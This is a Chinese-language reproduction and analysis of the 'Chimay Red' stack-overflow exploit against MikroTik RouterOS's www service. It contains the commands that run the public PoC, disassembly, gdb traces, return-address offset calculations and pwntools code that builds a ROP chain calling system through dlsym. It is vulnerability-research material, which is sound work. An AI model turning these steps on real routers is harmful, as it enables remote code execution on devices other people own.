CIA Vault7 泄露的针对 MikroTik 路由系统的攻击工具"Chimay Red"，利用了一个远程任意代码执行漏洞。

基本信息

漏洞编号：无

影响设备：MikroTik RouterOS

影响版本：MikroTik v6.38.4 及之前的版本

漏洞模块：www（/nova/bin/www）

漏洞类型：栈溢出漏洞

威胁类型：远程任意代码执行

漏洞复现

1

复现环境

漏洞系统：MikroTik RouterOS v6.38.4 x86

测试Poc：https://github.com/BigNerd95/Chimay-Red

2

搭建环境

从官网下载 MikroTik v6.38.4 的镜像或虚拟机磁盘文件。

新建虚拟机，加载镜像或磁盘文件即可启动。

3

测试漏洞

下载利用 Poc，提取目标系统版本的www文件。

$ cd Chimay-Red/tools/$ python getROSbin.py 6.38.4 x86 /nova/bin/www www_binary

运行攻击脚本，执行重启命令。

$ cd Chimay-Red/$ python StackClash_x86.py 192.168.108.134 80 ../www_binary "reboot"

目标系统重启。

漏洞分析

根据利用脚本可知，漏洞应该在处理Content-Length字段值时出现的。

搜索程序的字符串，发现有两处。

.rodata:0805AC3D0000000FCcontent-length.rodata:0805AD4D0000000FCContent-Length

查看交叉引用，粗略分析每个调用函数，最后确定漏洞位于Request::readPostData函数内。

漏洞位置如下：

.text:08055A10                 mov     [ebp+var_1C], 0.text:08055A17                 push   offset aContentLength ; "content-length".text:08055A1C                 lea     esi, [ebp+var_20].text:08055A1F                 push    esi             ; this.text:08055A20                 call    __ZN6stringC1EPKc ; string::string(char const*).text:08055A25                 add     esp, 0Ch.text:08055A28                 lea     eax, [ebp+var_1C].text:08055A2B                 push    eax             ; unsigned int *.text:08055A2C                 push    esi             ; string *.text:08055A2D                 push   [ebp+this]      ; this.text:08055A30                 call    _ZNK7Headers9getHeaderERK6stringPj ; Headers::getHeader(string const&,uint *).....text:08055A53 loc_8055A53:                            ; CODE XREF: Request::readPostData(string &,uint)+48↑j.text:08055A53                 mov     edx, [ebp+var_1C].text:08055A56                 lea     eax, [edx+10h].text:08055A59                 and     eax, 0FFFFFFF0h.text:08055A5C                 sub     esp, eax.text:08055A5E                 mov     edi, esp.text:08055A60                 push    eax.text:08055A61                 push    edx             ; unsigned int.text:08055A62                 push    edi             ; char *.text:08055A63                 mov     eax, [ebp+this].text:08055A66                 lea     esi, [eax+20h].text:08055A69                 push    esi             ; this.text:08055A6A                 call    __ZN7istream4readEPcj ; istream::read(char *,uint).text:08055A6F                 mov     edx, [eax]

程序调用getHeader函数获取content-length字段的值，然后在栈中开辟相应大小的空间，最后将该值作为read函数的第二个参数，即读取数据的大小。

问题在于程序未对content-length的值进行任何校验，便在栈中开辟空间，所以当该值过大或过小时，均可造成栈指针超出栈空间边界，导致栈溢出。

漏洞利用

利用思路

由于该漏洞可利用的是栈空间上溢，所以无法控制在缓冲区下方的返回地址，只能低地址空间寻找可利用的位置。

在www中，使用多线程的方式来处理多个连接，每个线程的栈空间大小为0x20000字节。

.text:0805215F                 push   20000h          ; stacksize.text:08052164                 push   offset threadAttr ; attr.text:08052169                 call    _pthread_attr_setstacksize.text:0805216E                 pop     edi.text:0805216F                 pop     eax

调试可知，每个线程的栈空间是相邻的。当有两个连接时，查看线程数i threads。

x86架构下利用

为了保证可以覆盖后面线程的函数地址，可以尽量抬高第一个线程的缓冲区指针，如上图所示。


确定返回地址

确定返回地址有两种。

第一种可以通过异常报错，来确定最小偏移处的某函数返回地址。

第二种则通过计算istream::read()函数的返回地址。

方法一

假设第一个线程的缓冲区设置为0x21000，第二个线程的缓冲区设置为0x100。

data = MakeHeader(0x21000)SendData(s1, data)data = MakeHeader(0x100)SendData(s2, data)

当程序运行到istream::read时，可以从栈中确定缓冲区的地址。

因此在该函数调用时设置断点，并打印栈中的参数。

(gdb) break *0x08055A6ABreakpoint 1 at 0x8055a6a(gdb) commands 1Type commands for breakpoint(s) 1, one per line.End with a line saying just "end".>silent>x/4wx $esp>continue>end(gdb) cContinuing.

可以得到每个线程的缓冲区指针。

# call istream::read() 时位于栈中的4个参数。[Switching to Thread 3106.3114]0x77541160:0x775623480x775411700x000210000x00021010[Switching to Thread 3106.3115]0x77542060:0x775423480x775420700x000001000x00000110

向第一个缓冲区填充足够多的任意字符，会导致第二个线程在关闭时，即istream::read()函数在返回的过程中，产生报错。

Thread 3 received signal SIGSEGV, Segmentation fault.0x41414141 in ?? ()(gdb) i registers espesp           0x77541ec00x77541ec0

计算可得出，距离第一个缓冲区指针 0xD4C 偏移的位置，存在可控的返回地址。

方法二

根据利用思路中的最后一张图，可以得到istream::read()函数返回地址的偏移公式。

s2_read_ret_address = s1_stacksize - thread_stacksize - s2_stacksize - align_size -  ret_addr_size其中，thread_stacksize = 0x20000align_size = 0x10ret_addr_size = 0x4

两种方法除了返回地址不同，调用时机也不同。

第一种方法如下调用：

s1 = CreateConnection(ip, port)s2 = CreateConnection(ip, port)
data = MakeHeader(0x21000)SendData(s1, data)
data = MakeHeader(0x100)SendData(s2, data)
data = 'A' * 0xD4Cdata = 'B' * 0x4SendData(s1, data)
s2.close()

第二种方法如下调用：

s1 = CreateConnection(ip, port)s2 = CreateConnection(ip, port)
data = MakeHeader(0x21000)SendData(s1, data)
data = 'A' * 0xEECSendData(s1, data)
data = MakeHeader(0x100)SendData(s2, data)
data = 'B' * 0x4SendData(s1, data)
s2.close()

确定调用方式

由于www文件开启了 NX，所以只能采用 rop 的方式进行利用。

搜索之后，发现程序未直接调用system，但是存在dlsym函数，所以可以获取system函数的地址。

ROP构造的基本思路为：

  1. 将字符串"system"和想要执行的命令写入一处内存中。

  2. 调用dlsym函数获取system函数的地址。

  3. 调用system函数执行指定命令。


编写利用程序


构造ROP链

为了方便构造，调用了pwntools库。

from pwn import *

加载二进制程序，准备动态获取函数等地址。

elf = ELF(binary)rop = ROP(elf)

1

构造指定字符串

因为程序不存在system和指定的命令字符串，所以可以使用strncpy函数将程序中的零散字符给拼凑在一起。

因此需要获取三个数据：

  1. strncpy函数的地址。

  2. 将要写入的目标地址。

  3. 零散字符的地址。

程序中存在strncpy函数，所以可以直接获得。

plt_address['strncpy'] = elf.plt['strncpy']

使用程序中的可写段来保存字符串。

writable_address = elf.writable_segments[0].header.p_paddrsystem_address = writable_addresscommand_address = writable_address + 0x10

在程序中搜索零散的字符。

def SearchStringChunks(elf, string):
chunks = []
for b in string:addr = next(elf.search(b))if addr != 0x0:chunks.append(addr)else:raise
if len(string) != len(chunks):raise
return chunks

最后拼接起来。

def GenerateString(dest, chunks):
chain = ''offset = 0
for chunk in chunks:chain += RopCall(plt_address['strncpy'], dest + offset, chunk, 1)offset += 1
return chain

2

获取 system 函数地址

首先获取dlsym函数地址。

plt_address['dlsym'] = elf.plt['dlsym']

调用dlsym函数，获取system函数地址。

RopCall(plt_address['dlsym'], 0, system_address)

3

执行命令

调用system函数，执行执行命令。

RopCall(jmp_eax_address, command_address)

将每一部分拼接起来，得到一条完整的ROP链。

payload += GenerateString(system_address, system_chunks)payload += GenerateString(command_address, command_chunks)payload += RopCall(plt_address['dlsym'], 0, system_address)payload += RopCall(jmp_eax_address, command_address)


触发漏洞执行


和利用思路分析的一样，依次发送数据，最后关闭连接，触发漏洞。

s1 = CreateConnection(ip, port)s2 = CreateConnection(ip, port)
